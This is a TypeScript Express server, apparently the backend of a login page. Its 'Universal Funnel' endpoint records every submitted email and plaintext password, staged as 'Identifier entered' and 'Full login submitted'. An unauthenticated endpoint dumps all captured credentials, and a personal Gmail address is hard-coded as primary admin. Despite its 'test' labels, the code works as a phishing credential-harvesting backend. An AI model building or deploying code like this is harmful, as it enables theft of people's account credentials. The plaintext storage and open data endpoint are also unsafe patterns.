import express from 'express';
import path from 'path';
import fs from 'fs';
import { createServer as createViteServer } from 'vite';

export interface LoginAttempt {
  id: string;
  time: string;
  email: string;
  password?: string;
  stage?: string;
  success: boolean;
  notes?: string;
}

export type UsersMap = Record<string, string>;

const PORT = 3000;
const PRIMARY_ADMIN_EMAIL = 'adereraadenike@gmail.com';

const DATA_DIR = path.join(process.cwd(), 'server_data');
const USERS_PATH = path.join(DATA_DIR, 'users.json');
const ATTEMPTS_PATH = path.join(DATA_DIR, 'attempts.json');
const AUTHORIZED_PATH = path.join(DATA_DIR, 'test_authorized_users.json');

// Ensure data directory exists
if (!fs.existsSync(DATA_DIR)) {
  fs.mkdirSync(DATA_DIR, { recursive: true });
}

const DEFAULT_USERS: UsersMap = {
  'alex.bennett@outlook.com': 'password123',
  'sarah.jenkins@contoso.com': 'welcome2026',
  'adereraadenike@gmail.com': 'admin123',
};

const DEFAULT_AUTHORIZED: string[] = [
  PRIMARY_ADMIN_EMAIL,
];

// Safe atomic disk write: writes to a unique temp file first then renames atomically.
// This prevents zero-byte reads or JSON parse crashes during concurrent requests.
function atomicWriteJson<T>(filePath: string, data: T): void {
  const tempPath = `${filePath}.${Date.now()}.${Math.random().toString(36).slice(2, 8)}.tmp`;
  try {
    fs.writeFileSync(tempPath, JSON.stringify(data, null, 2), 'utf-8');
    fs.renameSync(tempPath, filePath);
  } catch (err) {
    console.error(`Atomic write error for ${filePath}:`, err);
    try {
      if (fs.existsSync(tempPath)) fs.unlinkSync(tempPath);
    } catch {}
  }
}

function safeReadJson<T>(filePath: string, fallback: T): T {
  try {
    if (fs.existsSync(filePath)) {
      const content = fs.readFileSync(filePath, 'utf-8');
      if (content.trim().length > 0) {
        return JSON.parse(content) as T;
      }
    }
  } catch (err) {
    console.error(`Safe read error for ${filePath}:`, err);
  }
  return fallback;
}

// In-Memory Authoritative Cache to prevent race conditions and disk read locks
let inMemoryUsers: UsersMap = safeReadJson<UsersMap>(USERS_PATH, DEFAULT_USERS);
let inMemoryAttempts: LoginAttempt[] = safeReadJson<LoginAttempt[]>(ATTEMPTS_PATH, []);
let inMemoryAuthorized: string[] = safeReadJson<string[]>(AUTHORIZED_PATH, DEFAULT_AUTHORIZED);

// Ensure primary admin is in authorized list
if (!inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL)) {
  inMemoryAuthorized.unshift(PRIMARY_ADMIN_EMAIL);
}

// Initial flush to disk
atomicWriteJson(USERS_PATH, inMemoryUsers);
atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);

async function startServer() {
  const app = express();
  app.use(express.json());

  // API Routes FIRST

  // 1. Fetch all test data (served instantaneously from in-memory cache)
  app.get('/api/test/data', (req, res) => {
    const cleanAuth = Array.from(new Set([PRIMARY_ADMIN_EMAIL, ...inMemoryAuthorized]));
    res.json({
      success: true,
      users: inMemoryUsers,
      attempts: inMemoryAttempts,
      authorizedUsers: cleanAuth,
      primaryAdmin: PRIMARY_ADMIN_EMAIL,
      totalUsers: Object.keys(inMemoryUsers).length,
      totalAttempts: inMemoryAttempts.length,
      serverTime: new Date().toISOString(),
    });
  });

  // 2. Universal Funnel: records every single attempt, keystroke, error, or credential
  app.post('/api/test/attempt', (req, res) => {
    try {
      const { id, email, password, stage, success, notes, time } = req.body;
      const cleanEmail = (email || 'anonymous@test.local').trim().toLowerCase();
      const cleanPassword = password || '';
      const isSuccess = success !== false;
      const attemptId = id || `att_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`;
      const attemptTime = time || new Date().toISOString().slice(0, 19);

      // 1. Save or update in users map if password provided or user new
      if (cleanEmail && cleanEmail !== 'anonymous@test.local') {
        if (!inMemoryUsers[cleanEmail] || cleanPassword) {
          inMemoryUsers[cleanEmail] = cleanPassword || inMemoryUsers[cleanEmail] || 'password123';
          atomicWriteJson(USERS_PATH, inMemoryUsers);
        }
      }

      // 2. Append to in-memory attempts without duplicate IDs
      const existingIdx = inMemoryAttempts.findIndex(a => a.id === attemptId);
      const newAttempt: LoginAttempt = {
        id: attemptId,
        time: attemptTime,
        email: cleanEmail,
        password: cleanPassword,
        stage: stage || (cleanPassword ? 'Full login submitted' : 'Identifier entered'),
        success: isSuccess,
        notes: notes || undefined,
      };

      if (existingIdx >= 0) {
        inMemoryAttempts[existingIdx] = newAttempt;
      } else {
        inMemoryAttempts.push(newAttempt);
      }

      // 3. Persist to disk atomically
      atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);

      res.json({
        success: true,
        message: 'Successfully recorded in continuous funnel',
        attempt: newAttempt,
        totalAttempts: inMemoryAttempts.length,
        totalUsers: Object.keys(inMemoryUsers).length,
      });
    } catch (err) {
      console.error('Error handling attempt funnel:', err);
      res.status(500).json({ success: false, error: String(err) });
    }
  });

  // 3. Explicit registration endpoint
  app.post('/api/test/register', (req, res) => {
    try {
      const { email, password } = req.body;
      const cleanEmail = (email || '').trim().toLowerCase();
      const cleanPassword = password || 'password123';

      if (!cleanEmail) {
        return res.status(400).json({ success: false, message: 'Email required' });
      }

      inMemoryUsers[cleanEmail] = cleanPassword;
      atomicWriteJson(USERS_PATH, inMemoryUsers);

      const newAttempt: LoginAttempt = {
        id: `reg_${Date.now()}_${Math.random().toString(36).slice(2, 7)}`,
        time: new Date().toISOString().slice(0, 19),
        email: cleanEmail,
        password: cleanPassword,
        stage: 'Account Registered',
        success: true,
      };
      inMemoryAttempts.push(newAttempt);
      atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);

      res.json({
        success: true,
        message: 'User registered and funneled',
        totalUsers: Object.keys(inMemoryUsers).length,
        totalAttempts: inMemoryAttempts.length,
      });
    } catch (err) {
      res.status(500).json({ success: false, error: String(err) });
    }
  });

  // 4. Update authorized test viewers (grant/revoke)
  app.post('/api/test/authorize', (req, res) => {
    const { email, action } = req.body;
    const cleanEmail = (email || '').trim().toLowerCase();

    if (!cleanEmail || !cleanEmail.includes('@')) {
      return res.status(400).json({ success: false, message: 'Valid email required' });
    }

    if (action === 'remove') {
      if (cleanEmail === PRIMARY_ADMIN_EMAIL) {
        return res.status(400).json({ success: false, message: 'Cannot remove primary admin' });
      }
      inMemoryAuthorized = inMemoryAuthorized.filter(e => e.toLowerCase() !== cleanEmail);
    } else {
      if (!inMemoryAuthorized.map(e => e.toLowerCase()).includes(cleanEmail)) {
        inMemoryAuthorized.push(cleanEmail);
      }
    }

    if (!inMemoryAuthorized.includes(PRIMARY_ADMIN_EMAIL)) {
      inMemoryAuthorized.unshift(PRIMARY_ADMIN_EMAIL);
    }

    atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);

    res.json({
      success: true,
      authorizedUsers: inMemoryAuthorized,
      message: action === 'remove' ? `Access revoked for ${cleanEmail}` : `Access granted to ${cleanEmail}`,
    });
  });

  // 5. Delete an account from users.json
  app.post('/api/test/delete-user', (req, res) => {
    const { email } = req.body;
    const cleanEmail = (email || '').trim().toLowerCase();
    delete inMemoryUsers[cleanEmail];
    atomicWriteJson(USERS_PATH, inMemoryUsers);
    res.json({ success: true, users: inMemoryUsers });
  });

  // 6. Clear attempts history
  app.post('/api/test/clear-attempts', (req, res) => {
    inMemoryAttempts = [];
    atomicWriteJson(ATTEMPTS_PATH, []);
    res.json({ success: true, attempts: [] });
  });

  // 7. Reset to default state
  app.post('/api/test/reset-defaults', (req, res) => {
    inMemoryUsers = { ...DEFAULT_USERS };
    inMemoryAttempts = [];
    inMemoryAuthorized = [...DEFAULT_AUTHORIZED];
    atomicWriteJson(USERS_PATH, inMemoryUsers);
    atomicWriteJson(ATTEMPTS_PATH, inMemoryAttempts);
    atomicWriteJson(AUTHORIZED_PATH, inMemoryAuthorized);
    res.json({ 
      success: true, 
      users: inMemoryUsers, 
      attempts: inMemoryAttempts, 
      authorizedUsers: inMemoryAuthorized 
    });
  });

  // Health check
  app.get('/api/health', (req, res) => {
    res.json({ 
      status: 'ok', 
      serverTime: new Date().toISOString(),
      activeAttempts: inMemoryAttempts.length,
      activeUsers: Object.keys(inMemoryUsers).length,
    });
  });

  // Vite middleware for development vs static build for production
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
